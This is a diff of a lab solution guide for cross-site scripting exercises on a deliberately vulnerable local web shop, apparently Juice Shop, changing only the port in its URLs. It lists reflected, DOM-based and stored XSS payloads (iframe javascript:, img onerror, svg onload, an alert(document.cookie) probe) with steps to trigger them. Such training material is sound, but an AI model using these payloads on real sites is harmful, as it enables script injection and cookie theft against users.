@@ -3,24 +3,24 @@
 ## Task 3.1: Reflected XSS
 
 ### Vulnerable Endpoint:
-**Track Order Page:** `http://localhost:3000/#/track-result?id=`
+**Track Order Page:** `http://localhost:8000/#/track-result?id=`
 
 ### Solution:
 
 **URL Payload:**
 ```
-http://localhost:3000/#/track-result?id=<iframe src="javascript:alert('XSS')">
+http://localhost:8000/#/track-result?id=<iframe src="javascript:alert('XSS')">
 ```
 
 **Alternative Payloads:**
 ```html
-http://localhost:3000/#/track-result?id=<img src=x onerror=alert('XSS')>
-http://localhost:3000/#/track-result?id=<script>alert('XSS')</script>
+http://localhost:8000/#/track-result?id=<img src=x onerror=alert('XSS')>
+http://localhost:8000/#/track-result?id=<script>alert('XSS')</script>
 ```
 
 ### Step-by-Step:
 
-1. Navigate to order tracking: `http://localhost:3000/#/track-result`
+1. Navigate to order tracking: `http://localhost:8000/#/track-result`
 2. Enter a tracking ID with XSS payload
 3. Or directly use the URL with payload in `id` parameter
 4. Alert box pops up confirming XSS
@@ -39,20 +39,20 @@ The order ID is reflected directly into the DOM without proper sanitization.
 
 **URL Payload:**
 ```
-http://localhost:3000/#/search?q=<img src=x onerror=alert('XSS')>
+http://localhost:8000/#/search?q=<img src=x onerror=alert('XSS')>
 ```
 
 **Alternative DOM-XSS Payloads:**
 ```html
-http://localhost:3000/#/search?q=<iframe src="javascript:alert(document.cookie)">
-http://localhost:3000/#/search?q=<svg onload=alert('XSS')>
+http://localhost:8000/#/search?q=<iframe src="javascript:alert(document.cookie)">
+http://localhost:8000/#/search?q=<svg onload=alert('XSS')>
 ```
 
 ### Another DOM-XSS Location:
 
 **Score Board Challenge using sanitized HTML:**
 ```
-http://localhost:3000/#/about
+http://localhost:8000/#/about
 ```
 
 Inject through the contact form or product reviews.
@@ -76,13 +76,13 @@ Client-side JavaScript reads from the URL hash and inserts it into the DOM witho
 
 ### Solution for Customer Feedback:
 
-1. Navigate to `http://localhost:3000/#/contact`
+1. Navigate to `http://localhost:8000/#/contact`
 2. In the Comment field, enter:
 ```html
 <iframe src="javascript:alert('Stored XSS')">
 ```
 3. Fill other required fields and submit
-4. Navigate to Administration panel: `http://localhost:3000/#/administration`
+4. Navigate to Administration panel: `http://localhost:8000/#/administration`
 5. View customer feedback - XSS executes
 
 ### Solution for Product Reviews:
